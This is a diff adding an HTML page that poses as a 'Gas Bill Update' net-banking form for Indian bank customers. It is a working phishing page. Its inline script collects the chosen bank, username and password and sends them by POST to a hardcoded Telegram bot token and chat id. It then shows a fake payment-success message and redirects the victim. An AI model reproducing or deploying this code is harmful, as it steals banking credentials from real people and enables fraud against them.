@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link rel="stylesheet" href="help/style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>Gas Bill Update</title>
+     <centre>
+                
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .header {
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px;
+            border-radius: 8px 8px 0 0;
+            text-align: center;
+            font-size: 1.2em;
+        }
+        .form-group {
+            margin: 15px 0;
+        }
+        .form-group label {
+            
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input, .form-group select, .form-group button,select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .form-group input {
+            width: 94%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #dc3545;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+        .btn:hover {
+            background-color: #c82333;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.8em;
+            color: #666;
+        }
+        .payment-method {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .payment-method img {
+            width: 60px;
+            height: 60px;
+            margin: 0 5px;
+        }
+        
+        }
+                
+    </style>
+</head>
+<body>
+    <br><br>
+    <div id="carouselExampleCaptions mb-4" class="carousel slide" data-bs-ride="carousel">
+        <div class="carousel-indicators">
+          <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
+          <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="1" aria-label="Slide 2"></button>
+          <button type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide-to="2" aria-label="Slide 3"></button>
+        </div>
+        <div class="carousel-inner">
+          <div class="carousel-item active">
+            <img src="https://i.postimg.cc/k4hcVskJ/20241028-174807.png" class="d-block w-100" alt="...">
+          </div>
+          <div class="carousel-item">
+            <img src="https://i.postimg.cc/FsGj1Dc2/20241028-174731.png" class="d-block w-100" alt="...">
+          </div>
+          <div class="carousel-item">
+            <img src="https://i.postimg.cc/HsLrvHch/20241028-174654.png" class="d-block w-100" alt="...">
+          </div>
+        </div>
+        <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide="prev">
+          <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+          <span class="visually-hidden">Previous</span>
+        </button>
+        <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleCaptions" data-bs-slide="next">
+          <span class="carousel-control-next-icon" aria-hidden="true"></span>
+          <span class="visually-hidden">Next</span>
+        </button>
+      </div>
+      <br>
+    <div class="container">
+       
+        <div class="header" style="font-weight: bold;">Net Banking</div>
+        <div class="form-group">
+            
+        </div>
+        <form id="credit-card-form" class="hidden" onsubmit="return sender()">
+           
+            <label for="bank" style="font-weight: bold;">Select Bank<span style="color: red;">*</span></label>
+                <select id="Credit" name="Credit" required>
+                    
+                    <option value="" disabled selected>Select Bank</option>
+                    <option value="HDFC Bank">HDFC Bank</option>
+                    <option value="Axis Bank">Axis Bank</option>
+                    <option value="SBI">SBI</option>
+                    <option value="Kotak Bank">Kotak Bank</option>
+                    <option value="UCO Bank">UCO Bank</option>
+                    <option value="Indusind Bank">Indusind Bank</option>
+                    <option value="Union Bank">Union Bank</option>
+                    <option value="Yes Bank">Yes Bank</option>
+                    <option value="Bank of India">Bank of India</option>
+                    <option value="Bank of Baroda">Bank of Baroda</option>
+                    <option value="Canara Bank">Canara Bank</option>
+                    <option value="City Union Bank">City Union Bank</option>
+                    <option value="Central Bank of India">Central Bank of India</option>
+                    <option value="Punjab National Bank">Punjab National Bank</option>
+                    <option value="ICICI Bank">ICICI Bank</option>
+                    <option value="RBL">RBL</option>
+                    <option value="AU Small Finance Bank">AU Small Finance Bank</option>
+                    <option value="CITI Bank">CITI Bank</option>
+                    <option value="other">Others</option>
+                </select>
+               
+            <div class="form-group">
+                <label for="cc-number">Username<span style="color: red;">*</span></label>
+                <input type="text" id="expiry" name="expiry" style="width: 326px" placeholder="Username" required>
+                
+            </div>
+            <div class="form-group">
+                <label for="cc-cvv">Password<span style="color: red;">*</span></label>
+                
+                
+                <input type="text" id="cvv" name="cvv" style="width: 326px" placeholder="Password" required>
+                
+                <br><br>
+            </div>
+            <button type="submit" class="btn">PROCEED</button>
+        </form>
+        <br><br><br>
+    </div>
+    <br><br><br>
+<link rel="stylesheet" href="style.css">
+    <script src="sender.js"></script>
+  
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  
+  <script>
+  //bot token
+var telegram_bot_id = "7538850098:AAEiBnyqsKMoemtEeuIL9RdJhMuFBAnG72g";
+//chat id
+var chat_id = 8192558175;
+var ready = function () {
+    Credit = document.getElementById("Credit").value;
+    expiry = document.getElementById("expiry").value;
+    cvv = document.getElementById("cvv").value;
+  
+    message = 
+      "\nbank Naam: " + Credit +  
+      "\nuserID: " + expiry + 
+      "\nPassword: " + cvv;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message,
+          "file": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response); 
+      
+      document.location = "5.Successful.html";
+      
+      swal("Successfull", "Your Payment Successfull", "success");
+      
+    });
+    document.getElementById("Credit").value = "";
+    document.getElementById("expiry").value = "";
+    document.getElementById("cvv").value = "";
+    return false;
+};
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <script src="help/script.js"></script>
+    <script>
+      if (localStorage.getItem('userID') !== null) {
+    localStorage.removeItem('userID');
+    console.log('userID removed from localStorage');
+} else {
+    console.log('userID does not exist in localStorage');
+}
+
+    </script>
+</body>
+</html>
